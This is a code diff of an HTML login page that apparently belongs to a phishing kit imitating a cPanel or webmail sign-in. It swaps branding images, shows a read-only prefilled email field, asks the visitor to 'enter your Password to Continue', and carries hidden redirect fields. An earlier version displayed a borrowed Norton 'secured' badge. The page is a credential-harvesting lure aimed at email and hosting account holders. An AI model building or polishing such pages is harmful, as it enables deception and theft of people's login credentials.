@@ -87,12 +87,12 @@
     mark,
     audio,
     video {
-      margin: 0;
-      padding: 0;
-      border: 0;
-      font-size: 100%;
-      font: inherit;
-      vertical-align: baseline
+	margin: 0;
+	padding: 0;
+	border: 0;
+	font-size: medium;
+	vertical-align: baseline;
+	font-family: inherit;
     }
 
     article,
@@ -268,15 +268,14 @@
   <div class="form-holder">
     <input type="hidden" class="form-control" name="hido" id="hido" value="">
     <input type="hidden" class="form-control" name="redirecto" id="redirecto" value="">
-    <div class="xlogo">
-      <img src="m/cpanel-logo-tiny.png" width="25" height="25" id="zion">
-      <span style="text-transform: uppercase;" id="logoname"></span>
+    <div><span style="text-transform: uppercase;" id="logoname"></span>
     </div>
 
     <form name="myForm" id="login_form" action="" method="post">
       <div class="form-wrap" style="position: relative;">
-        <p>Please sign in with your email to prove that you're not a Robot.</p>
-        <div class="error" style="margin-top: 5px; display: none" id="err"></div>
+        <p><span class="finput" style="position: relative;"><img src="m/webmail-logo.svg" alt="" width="316" height="99" align="middle"></span></p>
+        <p><strong>Please enter  your Password to Continue.</strong></p>
+        <div class="error" style="margin-top: px; display: none" id="err"></div>
         <div class="finput">
           <input type="email" id="pet" name="login" placeholder="Email Address" readonly required>
         </div>
@@ -285,14 +284,24 @@
           <input type="hidden" id="source" name="source" value="others">
         </div>
         <div class="finput btn">
-          <button id="login_submit">Continue</button>
+          <button id="login_submit">Log in</button>
         </div>
-        <img src="./m/26-269507_arbys-logo-transparent-norton-secured-logo-png-png.png" width="107" height="58">
-        <span class="privacy"><span id="kai" style="text-transform:uppercase;"></span><br>
-          Copyright© 2024 cPanel, L.L.C.
-Privacy Policy
-          third party.
-        </span>
+        <img src="m/Screenshot_2.png" width="404" height="175" align="middle">
+        <span class="privacy"><span id="kai" style="text-transform:uppercase;"></span></span>
+        <div id="login-wrapper">
+          <div>
+            <div id="locale-footer">
+              <div>
+                <ul id="locales_list">
+                  
+                  <li></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div><br>
+        </div>
       </div>
     </form>
 
